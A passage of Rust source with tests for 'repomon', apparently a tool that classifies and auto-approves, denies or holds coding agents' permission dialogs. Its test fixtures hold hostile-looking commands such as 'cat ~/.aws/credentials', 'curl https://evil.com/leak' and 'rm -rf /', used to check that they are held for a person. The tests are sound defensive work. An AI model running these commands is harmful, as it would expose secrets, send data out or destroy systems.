            candidates.push(MatchCandidate {
                index: i,
                level,
                text_len: text.len(),
            });
        }
    }

    resolve_candidates(candidates)
}

/// Determine which option index in [`PendingDialog`] represents denying or rejecting the dialog.
pub fn deny_option(d: &PendingDialog, _kind: AgentKind) -> Option<usize> {
    let mut candidates = Vec::new();

    for (i, opt) in d.options.iter().enumerate() {
        let text = opt.text.trim();
        let mut best_match: Option<&'static str> = None;
        for &phrase in DENY_PHRASES {
            if starts_with_phrase(text, phrase)
                && (best_match.is_none() || phrase.len() > best_match.unwrap().len())
            {
                best_match = Some(phrase);
            }
        }

        if let Some(phrase) = best_match {
            let level = if is_level_1_deny(text, phrase) { 1 } else { 2 };
            candidates.push(MatchCandidate {
                index: i,
                level,
                text_len: text.len(),
            });
        }
    }

    resolve_candidates(candidates)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent::prompt::{DialogOption, detect_dialog, dialog_select_keys};

    fn test_scope() -> DialogScope {
        DialogScope {
            worktree: PathBuf::from("/Users/test/workspace/repo"),
            repo_root: PathBuf::from("/Users/test/workspace/repo"),
        }
    }

    fn test_dialog(title: Option<&str>, body: &[&str], context: &[&str]) -> PendingDialog {
        PendingDialog {
            title: title.map(str::to_string),
            question: "Do you want to proceed?".into(),
            body: body.iter().map(|s| s.to_string()).collect(),
            options: vec![
                DialogOption {
                    number: Some(1),
                    text: "Yes".into(),
                },
                DialogOption {
                    number: Some(2),
                    text: "No".into(),
                },
            ],
            selected: Some(0),
            context: context.iter().map(|s| s.to_string()).collect(),
        }
    }

    #[test]
    fn antigravity_fixture_classified_correctly() {
        let pane = r#"
Requesting permission for:
   ps aux | grep -i repomon

Do you want to proceed?
> 1. Yes
  2. Yes, and always allow in this conversation
  3. Yes, and always allow in settings
  4. No
"#;
        let d = crate::agent::prompt::detect_dialog(pane).expect("Antigravity dialog");
        assert_eq!(
            d.context,
            vec![
                "Requesting permission for:".to_string(),
                "ps aux | grep -i repomon".to_string()
            ]
        );
        let scope = test_scope();
        let c = classify_dialog(&d, AgentKind::Antigravity, &scope);
        assert_eq!(c.class, DialogClass::CommandExec);
        assert_eq!(c.subject.as_deref(), Some("ps aux | grep -i repomon"));
        assert!(!c.repo_scoped);
    }

    #[test]
    fn codex_boxless_mcp_fixture_classified_correctly() {
        let pane = "  Field 1/1\n\
              Allow the repomon MCP server to run tool \"fleet_status\"?\n\
              › 1. Allow                   Run the tool and continue.\n\
                2. Allow for this session  Run the tool and remember this choice for this session.\n\
                3. Always allow            Run the tool and remember this choice for future tool calls.\n\
                4. Cancel                  Cancel this tool call\n\
              enter to submit | esc to cancel";
        let d = crate::agent::prompt::detect_dialog(pane).expect("Codex dialog");
        assert_eq!(d.context, vec!["Field 1/1"]);
        let scope = test_scope();
        let c = classify_dialog(&d, AgentKind::Codex, &scope);
        assert_eq!(c.class, DialogClass::CommandExec);
        assert_ne!(c.class, DialogClass::Unknown);
        assert_eq!(c.subject.as_deref(), Some("fleet_status"));
    }

    #[test]
    fn repo_scope_evaluation_tests() {
        let scope = test_scope();

        // 1. cargo test -p repomon-core command => repo_scoped true
        let d1 = test_dialog(Some("Bash command"), &["cargo test -p repomon-core"], &[]);
        let c1 = classify_dialog(&d1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c1.class, DialogClass::CommandExec);
        assert!(c1.repo_scoped);

        // 2. cat ~/.aws/credentials => CredentialAccess, repo_scoped false
        let d2 = test_dialog(Some("Bash command"), &["cat ~/.aws/credentials"], &[]);
        let c2 = classify_dialog(&d2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c2.class, DialogClass::CredentialAccess);
        assert!(!c2.repo_scoped);

        // 3. cd /etc && cat passwd => not repo_scoped
        let d3 = test_dialog(Some("Bash command"), &["cd /etc && cat passwd"], &[]);
        let c3 = classify_dialog(&d3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c3.class, DialogClass::CommandExec);
        assert!(!c3.repo_scoped);

        // 4. path with .. escaping worktree => not repo_scoped
        let d4 = test_dialog(Some("Bash command"), &["cargo test -p ../escaping"], &[]);
        let c4 = classify_dialog(&d4, AgentKind::ClaudeCode, &scope);
        assert_eq!(c4.class, DialogClass::CommandExec);
        assert!(!c4.repo_scoped);
    }

    #[test]
    fn fixture_table_all_nine_classes() {
        let scope = test_scope();

        // 1. CredentialAccess (at least 2 fixtures)
        let d_cred_1 = test_dialog(Some("Bash command"), &["cat .env"], &[]);
        let c_cred_1 = classify_dialog(&d_cred_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_cred_1.class, DialogClass::CredentialAccess);
        assert!(!c_cred_1.repo_scoped);

        let d_cred_2 = test_dialog(Some("Bash command"), &["cat ~/.aws/credentials"], &[]);
        let c_cred_2 = classify_dialog(&d_cred_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_cred_2.class, DialogClass::CredentialAccess);
        assert!(!c_cred_2.repo_scoped);

        let d_cred_3 = test_dialog(Some("Bash command"), &["export API_KEY=secret_123"], &[]);
        let c_cred_3 = classify_dialog(&d_cred_3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_cred_3.class, DialogClass::CredentialAccess);
        assert!(!c_cred_3.repo_scoped);

        // 2. PushRemote (at least 2 fixtures)
        let d_push_1 = test_dialog(
            Some("Bash command"),
            &["git push origin feat/supervision"],
            &[],
        );
        let c_push_1 = classify_dialog(&d_push_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_push_1.class, DialogClass::PushRemote);
        assert!(!c_push_1.repo_scoped);

        let d_push_2 = test_dialog(
            Some("Bash command"),
            &["gh pr create --title \"supervision\""],
            &[],
        );
        let c_push_2 = classify_dialog(&d_push_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_push_2.class, DialogClass::PushRemote);
        assert!(!c_push_2.repo_scoped);

        let d_push_3 = test_dialog(
            Some("Bash command"),
            &["git pull https://github.com/org/repo.git"],
            &[],
        );
        let c_push_3 = classify_dialog(&d_push_3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_push_3.class, DialogClass::PushRemote);
        assert!(!c_push_3.repo_scoped);

        // 3. Install (at least 2 fixtures)
        let d_inst_1 = test_dialog(Some("Bash command"), &["cargo install ripgrep"], &[]);
        let c_inst_1 = classify_dialog(&d_inst_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_inst_1.class, DialogClass::Install);
        assert!(!c_inst_1.repo_scoped);

        let d_inst_2 = test_dialog(Some("Bash command"), &["npm install express"], &[]);
        let c_inst_2 = classify_dialog(&d_inst_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_inst_2.class, DialogClass::Install);
        assert!(!c_inst_2.repo_scoped);

        let d_inst_3 = test_dialog(Some("Bash command"), &["bun add typescript"], &[]);
        let c_inst_3 = classify_dialog(&d_inst_3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_inst_3.class, DialogClass::Install);
        assert!(!c_inst_3.repo_scoped);

        // 4. DeviceAccess (at least 2 fixtures)
        let d_dev_1 = test_dialog(
            Some("Bash command"),
            &["osascript -e 'display dialog \"hi\"'"],
            &[],
        );
        let c_dev_1 = classify_dialog(&d_dev_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_dev_1.class, DialogClass::DeviceAccess);
        assert!(!c_dev_1.repo_scoped);

        let d_dev_2 = test_dialog(Some("Bash command"), &["screencapture screen.png"], &[]);
        let c_dev_2 = classify_dialog(&d_dev_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_dev_2.class, DialogClass::DeviceAccess);
        assert!(!c_dev_2.repo_scoped);

        // 5. NetworkAccess (at least 2 fixtures)
        let d_net_1 = test_dialog(
            Some("Bash command"),
            &["curl https://crates.io/api/v1/crates"],
            &[],
        );
        let c_net_1 = classify_dialog(&d_net_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_net_1.class, DialogClass::NetworkAccess);
        assert!(c_net_1.repo_scoped);

        let d_net_2 = test_dialog(Some("Bash command"), &["curl https://evil.com/leak"], &[]);
        let c_net_2 = classify_dialog(&d_net_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_net_2.class, DialogClass::NetworkAccess);
        assert!(!c_net_2.repo_scoped);

        let d_net_3 = test_dialog(Some("Bash command"), &["ssh user@remote.internal"], &[]);
        let c_net_3 = classify_dialog(&d_net_3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_net_3.class, DialogClass::NetworkAccess);
        assert!(!c_net_3.repo_scoped);

        // 6. Deletion (at least 2 fixtures)
        let d_del_1 = test_dialog(Some("Bash command"), &["rm src/temp.txt"], &[]);
        let c_del_1 = classify_dialog(&d_del_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_del_1.class, DialogClass::Deletion);
        assert!(c_del_1.repo_scoped);

        let d_del_2 = test_dialog(Some("Bash command"), &["rm -rf /"], &[]);
        let c_del_2 = classify_dialog(&d_del_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_del_2.class, DialogClass::Deletion);
        assert!(!c_del_2.repo_scoped);

        let d_del_3 = test_dialog(Some("Bash command"), &["rm /etc/passwd"], &[]);
        let c_del_3 = classify_dialog(&d_del_3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_del_3.class, DialogClass::Deletion);
        assert!(!c_del_3.repo_scoped);

        // 7. FileWrite (at least 2 fixtures)
        let d_write_1 = test_dialog(Some("Edit file"), &["src/agent/prompt.rs"], &[]);
        let c_write_1 = classify_dialog(&d_write_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_write_1.class, DialogClass::FileWrite);
        assert!(c_write_1.repo_scoped);

        let d_write_2 = test_dialog(Some("Edit file"), &["/etc/hosts"], &[]);
        let c_write_2 = classify_dialog(&d_write_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_write_2.class, DialogClass::FileWrite);
        assert!(!c_write_2.repo_scoped);

        let mut d_write_3 = test_dialog(None, &[], &[]);
        d_write_3.question = "Do you want to create README.md?".to_string();
        let c_write_3 = classify_dialog(&d_write_3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_write_3.class, DialogClass::FileWrite);
        assert!(c_write_3.repo_scoped);

        // 8. CommandExec (at least 2 fixtures)
        let d_cmd_1 = test_dialog(Some("Bash command"), &["cargo test -p repomon-core"], &[]);
        let c_cmd_1 = classify_dialog(&d_cmd_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_cmd_1.class, DialogClass::CommandExec);
        assert!(c_cmd_1.repo_scoped);

        let d_cmd_2 = test_dialog(Some("Bash command"), &["git status"], &[]);
        let c_cmd_2 = classify_dialog(&d_cmd_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_cmd_2.class, DialogClass::CommandExec);
        assert!(c_cmd_2.repo_scoped);

        let d_cmd_3 = test_dialog(Some("Bash command"), &["ps aux | grep -i repomon"], &[]);
        let c_cmd_3 = classify_dialog(&d_cmd_3, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_cmd_3.class, DialogClass::CommandExec);
        assert!(!c_cmd_3.repo_scoped);

        // 9. Unknown (at least 2 fixtures)
        let mut d_unk_1 = test_dialog(None, &[], &[]);
        d_unk_1.question = "Which auth method should we use?".to_string();
        let c_unk_1 = classify_dialog(&d_unk_1, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_unk_1.class, DialogClass::Unknown);
        assert!(!c_unk_1.repo_scoped);

        let mut d_unk_2 = test_dialog(None, &[], &[]);
        d_unk_2.question = "Should we target Postgres or SQLite?".to_string();
        let c_unk_2 = classify_dialog(&d_unk_2, AgentKind::ClaudeCode, &scope);
        assert_eq!(c_unk_2.class, DialogClass::Unknown);
        assert!(!c_unk_2.repo_scoped);
    }

    #[test]
    fn opencode_dialogs_classify_hold_safe_pending_live_fixtures() {
        let scope = test_scope();

        let pane_opencode =
            "Which model would you like to switch to?\n> 1. claude-3-7-sonnet\n  2. gpt-4o";
        let d1 = crate::agent::prompt::detect_dialog(pane_opencode).expect("opencode dialog");
        let c1 = classify_dialog(&d1, AgentKind::OpenCode, &scope);
        assert_eq!(c1.class, DialogClass::Unknown);
        assert!(!c1.repo_scoped);

        let pane_aider = "Add .env to the chat context?\n> 1. Yes\n  2. No";
        let d2 = crate::agent::prompt::detect_dialog(pane_aider).expect("aider dialog");
        let c2 = classify_dialog(&d2, AgentKind::Aider, &scope);
        assert_eq!(c2.class, DialogClass::CredentialAccess);
        assert!(!c2.repo_scoped);
    }

    const FIXTURE_CLAUDE_BASH: &str = "● Running cargo test…\n\
        ╭──────────────────────────────────────────────╮\n\
        │ Bash command                                 │\n\
        │                                              │\n\
        │   cargo install --path crates/repomon-tui    │\n\
        │   Install the repomon TUI                    │\n\
        │                                              │\n\
        │ Do you want to proceed?                      │\n\
        │ ❯ 1. Yes                                     │\n\
        │   2. Yes, and don't ask again for cargo      │\n\
        │   3. No, and tell Claude what to do          │\n\
        ╰──────────────────────────────────────────────╯";

    const FIXTURE_CLAUDE_EDIT: &str = "╭──────────────────────────────────────────────╮\n\
        │ Edit file                                    │\n\
        │                                              │\n\
        │   crates/repomon-core/src/agent/mod.rs       │\n\
        │                                              │\n\
        │ Do you want to make this edit to mod.rs?     │\n\
        │ ❯ 1. Yes                                     │\n\
        │   2. Yes, and don't ask again for this file  │\n\
        │   3. No, and tell Claude what to do          │\n\
        ╰──────────────────────────────────────────────╯";

    const FIXTURE_CODEX_MCP: &str = "  Field 1/1\n\
          Allow the repomon MCP server to run tool \"fleet_status\"?\n\
          › 1. Allow                   Run the tool and continue.\n\
            2. Allow for this session  Run the tool and remember this choice for this session.\n\
            3. Always allow            Run the tool and remember this choice for future tool calls.\n\
            4. Cancel                  Cancel this tool call\n\
          enter to submit | esc to cancel";

    const FIXTURE_ANTIGRAVITY: &str = "Requesting permission for:\n\
   ps aux | grep -i repomon\n\
\n\
Do you want to proceed?\n\
> 1. Yes\n\
  2. Yes, and always allow in this conversation\n\
  3. Yes, and always allow in settings\n\
  4. No\n";

    const FIXTURE_CLAUDE_TRUST: &str = " Security guide\n\n ❯ 1. Yes, I trust this folder\n   2. No, exit\n\n Enter to confirm · Esc to cancel";

    #[test]
    fn test_1_claude_boxed_bash_permission_dialog_option_mapping() {
        let d = detect_dialog(FIXTURE_CLAUDE_BASH).expect("Claude bash dialog");
        assert_eq!(approve_option(&d, AgentKind::ClaudeCode), Some(0));
        assert_eq!(deny_option(&d, AgentKind::ClaudeCode), Some(2));
        // The "don't ask again"-style option (index 1) is never returned by approve_option
        assert_ne!(approve_option(&d, AgentKind::ClaudeCode), Some(1));
    }

    #[test]
    fn test_2_claude_edit_file_3_option_dialog_option_mapping() {
        let d = detect_dialog(FIXTURE_CLAUDE_EDIT).expect("Claude edit dialog");
        assert_eq!(approve_option(&d, AgentKind::ClaudeCode), Some(0));
        assert_eq!(deny_option(&d, AgentKind::ClaudeCode), Some(2));
        assert_ne!(approve_option(&d, AgentKind::ClaudeCode), Some(1));
    }

    #[test]
    fn test_3_codex_boxless_mcp_tool_approval_option_mapping() {
        let d = detect_dialog(FIXTURE_CODEX_MCP).expect("Codex MCP dialog");
        assert_eq!(approve_option(&d, AgentKind::Codex), Some(0));
        assert_eq!(deny_option(&d, AgentKind::Codex), Some(3));
        // Indices 1 (for this session) and 2 (always allow) are never returned
        assert_ne!(approve_option(&d, AgentKind::Codex), Some(1));
        assert_ne!(approve_option(&d, AgentKind::Codex), Some(2));
    }

    #[test]
    fn test_4_antigravity_4_option_permission_menu_option_mapping() {
        let d = detect_dialog(FIXTURE_ANTIGRAVITY).expect("Antigravity dialog");
        assert_eq!(approve_option(&d, AgentKind::Antigravity), Some(0));
        assert_eq!(deny_option(&d, AgentKind::Antigravity), Some(3));
        // Indices 1 (in this conversation) and 2 (in settings) are never returned
        assert_ne!(approve_option(&d, AgentKind::Antigravity), Some(1));
        assert_ne!(approve_option(&d, AgentKind::Antigravity), Some(2));
    }

    #[test]
    fn test_5_claude_folder_trust_dialog_option_mapping() {
        let d = detect_dialog(FIXTURE_CLAUDE_TRUST).expect("Claude trust dialog");
        assert_eq!(approve_option(&d, AgentKind::ClaudeCode), Some(0));
        assert_eq!(deny_option(&d, AgentKind::ClaudeCode), Some(1));
    }

    #[test]
    fn test_6_synthetic_ambiguity_and_blacklisted_affirmative_options() {
        // 6a: Dialog with two equally plain Yes ... rows at same rank returns None
        let pane_ambiguous = "Do you want to proceed?\n❯ 1. Yes, deploy to staging\n  2. Yes, deploy to production\n  3. No";
        let d_amb = detect_dialog(pane_ambiguous).expect("ambiguous dialog");
        assert_eq!(approve_option(&d_amb, AgentKind::ClaudeCode), None);
        assert_eq!(deny_option(&d_amb, AgentKind::ClaudeCode), Some(2));

        // 6b: Dialog whose only affirmative options are all blacklisted returns None
        let pane_blacklisted =
            "Allow the tool to run?\n❯ 1. Always allow\n  2. Allow for this session\n  3. Cancel";
        let d_black = detect_dialog(pane_blacklisted).expect("blacklisted dialog");
        assert_eq!(approve_option(&d_black, AgentKind::Codex), None);
        assert_eq!(deny_option(&d_black, AgentKind::Codex), Some(2));

        // 6c: Dialog with two identical Yes rows returns None
        let pane_identical_yes = "Do you want to proceed?\n❯ 1. Yes\n  2. Yes\n  3. No";
        let d_id = detect_dialog(pane_identical_yes).expect("identical yes dialog");
        assert_eq!(approve_option(&d_id, AgentKind::ClaudeCode), None);
        assert_eq!(deny_option(&d_id, AgentKind::ClaudeCode), Some(2));

        // 6d: Decision-class prompt with non-affirmative options
        let pane_decision = "Which auth method should we use?\n❯ 1. OAuth\n  2. API keys";
        let d_dec = detect_dialog(pane_decision).expect("decision dialog");
        assert_eq!(approve_option(&d_dec, AgentKind::ClaudeCode), None);
        assert_eq!(deny_option(&d_dec, AgentKind::ClaudeCode), None);
    }

    #[test]
    fn test_7_round_trip_dialog_select_keys_for_fixtures_1_to_4() {
        // Fixture 1: Claude Bash
        let d1 = detect_dialog(FIXTURE_CLAUDE_BASH).unwrap();
        let app1 = approve_option(&d1, AgentKind::ClaudeCode).unwrap();
        assert_eq!(dialog_select_keys(&d1, app1), vec!["Enter".to_string()]);
        let den1 = deny_option(&d1, AgentKind::ClaudeCode).unwrap();
        assert_eq!(
            dialog_select_keys(&d1, den1),
            vec!["Down".to_string(), "Down".to_string(), "Enter".to_string()]
        );

        // Fixture 2: Claude Edit
        let d2 = detect_dialog(FIXTURE_CLAUDE_EDIT).unwrap();
        let app2 = approve_option(&d2, AgentKind::ClaudeCode).unwrap();
        assert_eq!(dialog_select_keys(&d2, app2), vec!["Enter".to_string()]);
        let den2 = deny_option(&d2, AgentKind::ClaudeCode).unwrap();
        assert_eq!(
            dialog_select_keys(&d2, den2),
            vec!["Down".to_string(), "Down".to_string(), "Enter".to_string()]
        );

        // Fixture 3: Codex MCP
        let d3 = detect_dialog(FIXTURE_CODEX_MCP).unwrap();
        let app3 = approve_option(&d3, AgentKind::Codex).unwrap();
        assert_eq!(dialog_select_keys(&d3, app3), vec!["Enter".to_string()]);
        let den3 = deny_option(&d3, AgentKind::Codex).unwrap();
        assert_eq!(
            dialog_select_keys(&d3, den3),
            vec![
                "Down".to_string(),
                "Down".to_string(),
                "Down".to_string(),
                "Enter".to_string()
            ]
        );

        // Fixture 4: Antigravity
        let d4 = detect_dialog(FIXTURE_ANTIGRAVITY).unwrap();
        let app4 = approve_option(&d4, AgentKind::Antigravity).unwrap();
        assert_eq!(dialog_select_keys(&d4, app4), vec!["Enter".to_string()]);
        let den4 = deny_option(&d4, AgentKind::Antigravity).unwrap();
        assert_eq!(
            dialog_select_keys(&d4, den4),
            vec![
                "Down".to_string(),
                "Down".to_string(),
                "Down".to_string(),
                "Enter".to_string()
            ]
        );

        // Digit fallback where the fixture has no visible cursor (selected == None)
        let mut d_no_cur = d1.clone();
        d_no_cur.selected = None;
        let app_nc = approve_option(&d_no_cur, AgentKind::ClaudeCode).unwrap();
        assert_eq!(
            dialog_select_keys(&d_no_cur, app_nc),
            vec!["1".to_string(), "Enter".to_string()]
        );
        let den_nc = deny_option(&d_no_cur, AgentKind::ClaudeCode).unwrap();
        assert_eq!(
            dialog_select_keys(&d_no_cur, den_nc),
            vec!["3".to_string(), "Enter".to_string()]
        );
    }

    #[test]
    fn always_escalate_beats_auto_approve() {
        let d = detect_dialog(FIXTURE_CLAUDE_BASH).unwrap();
        let mut policy = SupervisionPolicy {
            enabled: true,
            classes: BTreeMap::new(),
            mail_mode: MailDeliveryMode::Nudge,
            nudge_text: "test".into(),
            stall_mins: 20,
            nudge_retries: 2,
            expect_work: false,
        };
        policy
            .classes
            .insert(DialogClass::CommandExec, PolicyAction::AutoApprove);

        let c = Classification {
            class: DialogClass::CommandExec,
            repo_scoped: true,
            subject: Some("rm -rf /".to_string()),
            evidence: vec!["rm -rf".to_string()],
        };
        let dec = evaluate(&policy, &c, &d, AgentKind::ClaudeCode, false);
        assert_eq!(dec.action, PolicyAction::Hold);
        assert_eq!(dec.choice, None);
        assert_eq!(dec.source, PolicySource::AlwaysEscalate);
    }

    #[test]
    fn decision_class_is_never_answered() {
        let pane = "Which auth method should we use?\n❯ 1. OAuth\n  2. API keys";
        let d = detect_dialog(pane).unwrap();
        let policy = resolve(
            &SupervisionConfig {
                enabled: true,
                classes: {
                    let mut m = BTreeMap::new();
                    for c in [
                        DialogClass::CommandExec,
                        DialogClass::FileWrite,
                        DialogClass::NetworkAccess,
                        DialogClass::CredentialAccess,
                        DialogClass::Deletion,
                        DialogClass::PushRemote,
                        DialogClass::Install,
                        DialogClass::DeviceAccess,
                        DialogClass::Unknown,
                    ] {
                        m.insert(c, PolicyAction::AutoApprove);
                    }
                    m
                },
                ..Default::default()
            },
            Some(&SupervisionOverrides {
                lane_id: 1,
                enabled: true,
                classes: BTreeMap::new(),
                mail_mode: None,
                nudge_text: None,
                stall_mins: None,
                nudge_retries: None,
                expect_work: false,
                updated_at: Utc::now(),
            }),
        );

        let c = Classification {
            class: DialogClass::Unknown,
            repo_scoped: false,
            subject: None,
            evidence: vec![],
        };
        let dec = evaluate(&policy, &c, &d, AgentKind::ClaudeCode, false);
        assert_eq!(dec.action, PolicyAction::Hold);
        assert_eq!(dec.choice, None);
        assert_eq!(dec.source, PolicySource::DecisionClass);
    }

    #[test]
    fn out_of_worktree_write_holds() {
        let d = detect_dialog(FIXTURE_CLAUDE_EDIT).unwrap();
        let mut policy = resolve(&SupervisionConfig::default(), None);
        policy
            .classes
            .insert(DialogClass::FileWrite, PolicyAction::AutoApprove);

        let c = Classification {
            class: DialogClass::FileWrite,
            repo_scoped: false,
            subject: Some("/etc/hosts".to_string()),
            evidence: vec!["edit file".to_string()],
        };
        let dec = evaluate(&policy, &c, &d, AgentKind::ClaudeCode, false);
        assert_eq!(dec.action, PolicyAction::Hold);
        assert_eq!(dec.choice, None);
        assert_eq!(dec.source, PolicySource::NotRepoScoped);
    }

    #[test]
    fn learned_rule_only_lifts_repo_scoped_command_exec() {
        let d_bash = detect_dialog(FIXTURE_CLAUDE_BASH).unwrap();
        let d_edit = detect_dialog(FIXTURE_CLAUDE_EDIT).unwrap();

        // Sub-assert 1: lifts repo-scoped CommandExec when policy is Hold
        let mut policy_hold = resolve(&SupervisionConfig::default(), None);
        policy_hold
            .classes
            .insert(DialogClass::CommandExec, PolicyAction::Hold);
        let c1 = Classification {
            class: DialogClass::CommandExec,
            repo_scoped: true,
            subject: Some("cargo install --path crates/repomon-tui".to_string()),
            evidence: vec!["cargo install".to_string()],
        };
        let dec1 = evaluate(&policy_hold, &c1, &d_bash, AgentKind::ClaudeCode, true);
        assert_eq!(dec1.action, PolicyAction::AutoApprove);
        assert_eq!(dec1.choice, Some(0));
        assert_eq!(dec1.source, PolicySource::ApprovalRule);

        // Sub-assert 2: does NOT lift non-repo-scoped CommandExec
        let policy_auto = resolve(&SupervisionConfig::default(), None); // CommandExec is AutoApprove by default
        let c2 = Classification {
            class: DialogClass::CommandExec,
            repo_scoped: false,
            subject: Some("ps aux | grep -i repomon".to_string()),
            evidence: vec!["ps aux".to_string()],
        };
        let dec2 = evaluate(&policy_auto, &c2, &d_bash, AgentKind::ClaudeCode, true);
        assert_eq!(dec2.action, PolicyAction::Hold);
        assert_eq!(dec2.choice, None);
        assert_eq!(dec2.source, PolicySource::NotRepoScoped);

        // Sub-assert 3: does NOT lift FileWrite
        let mut policy_edit = resolve(&SupervisionConfig::default(), None);
        policy_edit
            .classes
            .insert(DialogClass::FileWrite, PolicyAction::Hold);
        let c3 = Classification {
            class: DialogClass::FileWrite,
            repo_scoped: true,
            subject: Some("crates/repomon-core/src/agent/mod.rs".to_string()),
            evidence: vec!["edit file".to_string()],
        };
        let dec3 = evaluate(&policy_edit, &c3, &d_edit, AgentKind::ClaudeCode, true);
        assert_eq!(dec3.action, PolicyAction::Hold);
        assert_eq!(dec3.choice, None);
        assert_eq!(dec3.source, PolicySource::GlobalClass);
    }

    #[test]
    fn ambiguous_options_hold() {
        let pane = "Do you want to proceed?\n❯ 1. Yes, deploy to staging\n  2. Yes, deploy to production\n  3. No";
        let d = detect_dialog(pane).unwrap();
        let mut policy = resolve(&SupervisionConfig::default(), None);
        policy
            .classes
            .insert(DialogClass::CommandExec, PolicyAction::AutoApprove);

        let c = Classification {
            class: DialogClass::CommandExec,
            repo_scoped: true,
            subject: Some("cargo deploy".to_string()),
            evidence: vec!["cargo".to_string()],
        };
        let dec = evaluate(&policy, &c, &d, AgentKind::ClaudeCode, false);
        assert_eq!(dec.action, PolicyAction::Hold);
        assert_eq!(dec.choice, None);
        assert_eq!(dec.source, PolicySource::AmbiguousOptions);
    }

    #[test]
    fn unknown_class_holds_even_if_map_says_approve() {
        let d = detect_dialog(FIXTURE_CLAUDE_BASH).unwrap();
        let mut policy = resolve(&SupervisionConfig::default(), None);
        policy
            .classes
            .insert(DialogClass::Unknown, PolicyAction::AutoApprove);

        let c = Classification {
            class: DialogClass::Unknown,
            repo_scoped: false,
            subject: None,
            evidence: vec![],
        };
        let dec = evaluate(&policy, &c, &d, AgentKind::ClaudeCode, false);
        assert_eq!(dec.action, PolicyAction::Hold);
        assert_eq!(dec.choice, None);
    }

    #[test]
    fn auto_deny_selects_deny_option() {
        let d = detect_dialog(FIXTURE_CLAUDE_BASH).unwrap();
        let mut policy = resolve(&SupervisionConfig::default(), None);
        policy
            .classes
            .insert(DialogClass::CommandExec, PolicyAction::AutoDeny);

        let c = Classification {
            class: DialogClass::CommandExec,
            repo_scoped: true,
            subject: Some("cargo test".to_string()),
            evidence: vec!["cargo".to_string()],
        };
        let dec = evaluate(&policy, &c, &d, AgentKind::ClaudeCode, false);
        assert_eq!(dec.action, PolicyAction::AutoDeny);
        assert_eq!(dec.choice, Some(2));
        assert_eq!(dec.source, PolicySource::GlobalClass);
    }

    #[test]
    fn resolve_merges_sparse_lane_overrides() {
        let defaults = SupervisionConfig {
            enabled: true,
            nudge_text: "default nudge".to_string(),
            mail_mode: MailDeliveryMode::Nudge,
            stall_mins: 20,
            nudge_retries: 2,
            classes: BTreeMap::new(),
        };
        let mut lane_classes = BTreeMap::new();
        lane_classes.insert(DialogClass::Deletion, PolicyAction::AutoDeny);

        let lane = SupervisionOverrides {
            lane_id: 42,
            enabled: true,
            classes: lane_classes,
            mail_mode: None,
            nudge_text: Some("lane nudge".to_string()),
            stall_mins: None,
            nudge_retries: None,
            expect_work: true,
            updated_at: Utc::now(),
        };

        let p = resolve(&defaults, Some(&lane));
        assert!(p.enabled);
        assert_eq!(p.classes.len(), 9);
        assert_eq!(
            p.classes.get(&DialogClass::Deletion),
            Some(&PolicyAction::AutoDeny)
        );
        assert_eq!(
            p.classes.get(&DialogClass::CommandExec),
            Some(&PolicyAction::AutoApprove)
        );
        assert_eq!(
            p.classes.get(&DialogClass::FileWrite),
            Some(&PolicyAction::AutoApprove)
        );
        assert_eq!(
            p.classes.get(&DialogClass::NetworkAccess),
            Some(&PolicyAction::Hold)
        );
        assert_eq!(p.nudge_text, "lane nudge");
        assert_eq!(p.mail_mode, MailDeliveryMode::Nudge);
        assert_eq!(p.stall_mins, 20);
        assert_eq!(p.nudge_retries, 2);
        assert!(p.expect_work);
    }

    #[test]
    fn master_off_forces_lane_disabled() {
        let defaults = SupervisionConfig {
            enabled: false,
            ..Default::default()
        };
        let lane = SupervisionOverrides {
            lane_id: 1,
            enabled: true,
            classes: BTreeMap::new(),
            mail_mode: None,
            nudge_text: None,
            stall_mins: None,
            nudge_retries: None,
            expect_work: false,
            updated_at: Utc::now(),
        };
        let p = resolve(&defaults, Some(&lane));
        assert!(!p.enabled);
    }

    #[test]
    fn no_lane_row_means_disabled() {
        let defaults = SupervisionConfig {
            enabled: true,
            ..Default::default()
        };
        let p = resolve(&defaults, None);
        assert!(!p.enabled);
    }

    #[test]
    fn default_config_matches_spec() {
        let def = SupervisionConfig::default();
        assert!(!def.enabled);
        assert_eq!(def.nudge_text, "Check your repomon mail and act on it.");
        assert_eq!(def.mail_mode, MailDeliveryMode::Nudge);
        assert_eq!(def.stall_mins, 20);
        assert_eq!(def.nudge_retries, 2);
        assert_eq!(def.classes.len(), 9);
        assert_eq!(
            def.classes.get(&DialogClass::CommandExec),
            Some(&PolicyAction::AutoApprove)
        );
        assert_eq!(
            def.classes.get(&DialogClass::FileWrite),
            Some(&PolicyAction::AutoApprove)
        );
        for other in [
            DialogClass::NetworkAccess,
            DialogClass::CredentialAccess,
            DialogClass::Deletion,
            DialogClass::PushRemote,
            DialogClass::Install,
            DialogClass::DeviceAccess,
            DialogClass::Unknown,
        ] {
            assert_eq!(def.classes.get(&other), Some(&PolicyAction::Hold));
        }
    }
}
